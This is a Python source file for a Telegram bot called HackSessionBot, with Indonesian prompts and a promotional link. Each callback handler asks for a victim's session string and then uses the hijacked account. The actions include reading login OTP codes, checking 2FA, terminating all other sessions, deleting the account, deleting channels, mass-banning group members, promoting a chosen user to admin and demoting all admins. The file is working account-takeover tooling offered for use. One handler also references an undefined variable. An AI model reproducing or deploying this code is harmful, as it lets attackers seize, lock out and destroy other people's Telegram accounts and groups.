import os
from HackSessionBot import app,API_ID,API_HASH
from pyrogram import filters , Client
from HackSessionBot.Helpers.steve import (
    users_gc,
    user_info,
    banall,
    get_otp,
    join_ch,
    leave_ch,
    del_ch,
    check_2fa,
    terminate_all,
    del_acc,
    piromote,
    demote_all)
from HackSessionBot.Helpers.data import HACK_MODS 
from pyrogram.types import CallbackQuery 
from pyrogram.raw import functions
from telethon import TelegramClient 
from telethon.sessions import StringSession 



@app.on_callback_query(filters.regex("A"))
async def a_callback(client : Client , query : CallbackQuery):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id,"Sᴇᴋᴀʀᴀɴɢ Bᴇʀɪ Sᴀʏᴀ Sᴇsɪ Sᴛʀɪɴɢ Pᴇɴɢɢᴜɴᴀ Iᴛᴜ")    
    ch = await users_gc(session.text)
    if len(ch) > 3855:
        file = open("session.txt", "w")
        file.write(ch)
        file.close()
        await client.send_document(chat_id, "session.txt")
        os.system("rm -rf session.txt")
    else:
        await query.message.reply_text(text = ch + "\n\n**Tᴇʀɪᴍᴀ ᴋᴀsɪʜ ᴛᴇʟᴀʜ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ sᴀʏᴀ, ʙᴇʀɪᴋᴀɴ ʙɪɴᴛᴀɴɢ ᴘᴀᴅᴀ [sᴀʟᴜʀᴀɴ] sᴀʏᴀ](https://t.me/Revanstoreya)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

    
@app.on_callback_query(filters.regex("B"))
async def b_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"Sᴇᴋᴀʀᴀɴɢ Bᴇʀɪ Sᴀʏᴀ Sᴇsɪ Sᴛʀɪɴɢ Pᴇɴɢɢᴜɴᴀ Iᴛᴜ.")
    info = await user_info(session.text)
    await query.message.reply_text(text = info + "\n\n**Tᴇʀɪᴍᴀ ᴋᴀsɪʜ ᴛᴇʟᴀʜ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ sᴀʏᴀ, ʙᴇʀɪᴋᴀɴ ʙɪɴᴛᴀɴɢ ᴘᴀᴅᴀ [sᴀʟᴜʀᴀɴ] sᴀʏᴀ(https://t.me/Revanstoreya)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("C"))
async def c_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"Sᴇᴋᴀʀᴀɴɢ Bᴇʀɪ Sᴀʏᴀ Sᴇsɪ Sᴛʀɪɴɢ Pᴇɴɢɢᴜɴᴀ Iᴛᴜ.")
    gc = await client.ask(id,"Sᴇᴋᴀʀᴀɴɢ Bᴇʀɪ Sᴀʏᴀ Iᴅ Gʀᴜᴘ/Sᴀʟᴜʀᴀɴ Aᴛᴀᴜ Nᴀᴍᴀ Pᴇɴɢɢᴜɴᴀ") 
    hehe = await banall(session.text,gc)
    await query.message.reply_text(text = hehe + "\n\n**Tᴇʀɪᴍᴀ ᴋᴀsɪʜ ᴛᴇʟᴀʜ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ sᴀʏᴀ, ʙᴇʀɪᴋᴀɴ ʙɪɴᴛᴀɴɢ ᴘᴀᴅᴀ [sᴀʟᴜʀᴀɴ] sᴀʏᴀ(https://t.me/Revanstoreya)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("D"))
async def d_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"Sᴇᴋᴀʀᴀɴɢ Bᴇʀɪ Sᴀʏᴀ Sᴇsɪ Sᴛʀɪɴɢ Pᴇɴɢɢᴜɴᴀ Iᴛᴜ.")
    hehe = await get_otp(session.text)
    await query.message.reply_text(text = hehe + "\n\n**Tᴇʀɪᴍᴀ ᴋᴀsɪʜ ᴛᴇʟᴀʜ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ sᴀʏᴀ, ʙᴇʀɪᴋᴀɴ ʙɪɴᴛᴀɴɢ ᴘᴀᴅᴀ [sᴀʟᴜʀᴀɴ] sᴀʏᴀ(https://t.me/Revanstoreya)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("E"))
async def e_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"Sᴇᴋᴀʀᴀɴɢ Bᴇʀɪ Sᴀʏᴀ Sᴇsɪ Sᴛʀɪɴɢ Pᴇɴɢɢᴜɴᴀ Iᴛᴜ.")
    gc = await client.ask(id,"Sᴇᴋᴀʀᴀɴɢ Bᴇʀɪ Sᴀʏᴀ Iᴅ Gʀᴜᴘ/Sᴀʟᴜʀᴀɴ Aᴛᴀᴜ Nᴀᴍᴀ Pᴇɴɢɢᴜɴᴀ") 
    hehe = await join_ch(session.text,gc)
    await query.message.reply_text(text = hehe + "\n\n**Tᴇʀɪᴍᴀ ᴋᴀsɪʜ ᴛᴇʟᴀʜ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ sᴀʏᴀ, ʙᴇʀɪᴋᴀɴ ʙɪɴᴛᴀɴɢ ᴘᴀᴅᴀ [sᴀʟᴜʀᴀɴ] sᴀʏᴀ(https://t.me/Revanstoreya)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("F"))
async def f_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"Sᴇᴋᴀʀᴀɴɢ Bᴇʀɪ Sᴀʏᴀ Sᴇsɪ Sᴛʀɪɴɢ Pᴇɴɢɢᴜɴᴀ Iᴛᴜ.")
    gc = await client.ask(id,"Sᴇᴋᴀʀᴀɴɢ Bᴇʀɪ Sᴀʏᴀ Iᴅ Gʀᴜᴘ/Sᴀʟᴜʀᴀɴ Aᴛᴀᴜ Nᴀᴍᴀ Pᴇɴɢɢᴜɴᴀ") 
    hehe = await leave_ch(session.text,gc)
    await query.message.reply_text(text = hehe + "\n\n**Tᴇʀɪᴍᴀ ᴋᴀsɪʜ ᴛᴇʟᴀʜ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ sᴀʏᴀ, ʙᴇʀɪᴋᴀɴ ʙɪɴᴛᴀɴɢ ᴘᴀᴅᴀ [sᴀʟᴜʀᴀɴ] sᴀʏᴀ(https://t.me/Revanstoreya)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("G"))
async def g_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"Sᴇᴋᴀʀᴀɴɢ Bᴇʀɪ Sᴀʏᴀ Sᴇsɪ Sᴛʀɪɴɢ Pᴇɴɢɢᴜɴᴀ Iᴛᴜ.")
    gc = await client.ask(id,"Sᴇᴋᴀʀᴀɴɢ Bᴇʀɪ Sᴀʏᴀ Iᴅ Gʀᴜᴘ/Sᴀʟᴜʀᴀɴ Aᴛᴀᴜ Nᴀᴍᴀ Pᴇɴɢɢᴜɴᴀ") 
    hehe = await del_ch(session.text,gc)
    await query.message.reply_text(text = hehe + "\n\n**Tᴇʀɪᴍᴀ ᴋᴀsɪʜ ᴛᴇʟᴀʜ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ sᴀʏᴀ, ʙᴇʀɪᴋᴀɴ ʙɪɴᴛᴀɴɢ ᴘᴀᴅᴀ [sᴀʟᴜʀᴀɴ] sᴀʏᴀ(https://t.me/Revanstoreya)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)


@app.on_callback_query(filters.regex("H"))
async def h_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"Sᴇᴋᴀʀᴀɴɢ Bᴇʀɪ Sᴀʏᴀ Sᴇsɪ Sᴛʀɪɴɢ Pᴇɴɢɢᴜɴᴀ Iᴛᴜ.")
    hehe = await check_2fa(session.text)
    await query.message.reply_text(text = hehe + "\n\n**Tᴇʀɪᴍᴀ ᴋᴀsɪʜ ᴛᴇʟᴀʜ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ sᴀʏᴀ, ʙᴇʀɪᴋᴀɴ ʙɪɴᴛᴀɴɢ ᴘᴀᴅᴀ [sᴀʟᴜʀᴀɴ] sᴀʏᴀ(https://t.me/Revanstoreya)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("I"))
async def i_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"Sᴇᴋᴀʀᴀɴɢ Bᴇʀɪ Sᴀʏᴀ Sᴇsɪ Sᴛʀɪɴɢ Pᴇɴɢɢᴜɴᴀ Iᴛᴜ.")
    hehe = await terminate_all(session.text)
    await query.message.reply_text(text = hehe + "\n\n**Tᴇʀɪᴍᴀ ᴋᴀsɪʜ ᴛᴇʟᴀʜ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ sᴀʏᴀ, ʙᴇʀɪᴋᴀɴ ʙɪɴᴛᴀɴɢ ᴘᴀᴅᴀ [sᴀʟᴜʀᴀɴ] sᴀʏᴀ(https://t.me/Revanstoreya)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("J"))
async def j_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"Sᴇᴋᴀʀᴀɴɢ Bᴇʀɪ Sᴀʏᴀ Sᴇsɪ Sᴛʀɪɴɢ Pᴇɴɢɢᴜɴᴀ Iᴛᴜ.")    
    hehe = await del_acc(session.text)
    await query.message.reply_text(text = hehe + "\n\n**Tᴇʀɪᴍᴀ ᴋᴀsɪʜ ᴛᴇʟᴀʜ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ sᴀʏᴀ, ʙᴇʀɪᴋᴀɴ ʙɪɴᴛᴀɴɢ ᴘᴀᴅᴀ [sᴀʟᴜʀᴀɴ] sᴀʏᴀ(https://t.me/Revanstoreya)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("K"))
async def k_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"Sᴇᴋᴀʀᴀɴɢ Bᴇʀɪ Sᴀʏᴀ Sᴇsɪ Sᴛʀɪɴɢ Pᴇɴɢɢᴜɴᴀ Iᴛᴜ.")    
    user_id = await client.ask(id,"Bᴇʀɪᴋᴀɴ Sᴀʏᴀ Usᴇʀ Iᴅ/Nᴀᴍᴀ Pᴇɴɢɢᴜɴᴀ Yᴀɴɢ Aᴋᴀɴ Sᴀʏᴀ Pʀᴏᴍᴏsɪᴋᴀɴ.")
    gc_id = await client.ask(id,"Sᴇᴋᴀʀᴀɴɢ Bᴇʀɪ Sᴀʏᴀ Iᴅ Gʀᴜᴘ/Nᴀᴍᴀ Pᴇɴɢɢᴜɴᴀ Dɪᴍᴀɴᴀ Sᴀʏᴀ Aᴋᴀɴ Mᴇᴍᴘʀᴏᴍᴏsɪᴋᴀɴ Pᴇɴɢɢᴜɴᴀ Iᴛᴜ.")
    hehe = await piromote(session.text,gc_id,user_id)
    await query.message.reply_text(text = hehe + "\n\n**Tᴇʀɪᴍᴀ ᴋᴀsɪʜ ᴛᴇʟᴀʜ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ sᴀʏᴀ, ʙᴇʀɪᴋᴀɴ ʙɪɴᴛᴀɴɢ ᴘᴀᴅᴀ [sᴀʟᴜʀᴀɴ] sᴀʏᴀ(https://t.me/Revanstoreya)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("L"))
async def l_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"Sᴇᴋᴀʀᴀɴɢ Bᴇʀɪ Sᴀʏᴀ Sᴇsɪ Sᴛʀɪɴɢ Pᴇɴɢɢᴜɴᴀ Iᴛᴜ.")    
    gc_id = await client.ask(id,"Sᴇᴋᴀʀᴀɴɢ Bᴇʀɪ Sᴀʏᴀ ID Gʀᴜᴘ/Nᴀᴍᴀ Pᴇɴɢɢᴜɴᴀ Dɪᴍᴀɴᴀ Sᴀʏᴀ Aᴋᴀɴ Mᴇɴᴜʀᴜɴᴋᴀɴ Sᴇᴍᴜᴀ Aɴɢɢᴏᴛᴀ.")
    hehe = await demote_all(session.text,gc_id,user_id)
    await query.message.reply_text(text = hehe + "\n\n**Tᴇʀɪᴍᴀ ᴋᴀsɪʜ ᴛᴇʟᴀʜ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ sᴀʏᴀ, ʙᴇʀɪᴋᴀɴ ʙɪɴᴛᴀɴɢ ᴘᴀᴅᴀ [sᴀʟᴜʀᴀɴ] sᴀʏᴀ(https://t.me/Revanstoreya)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)


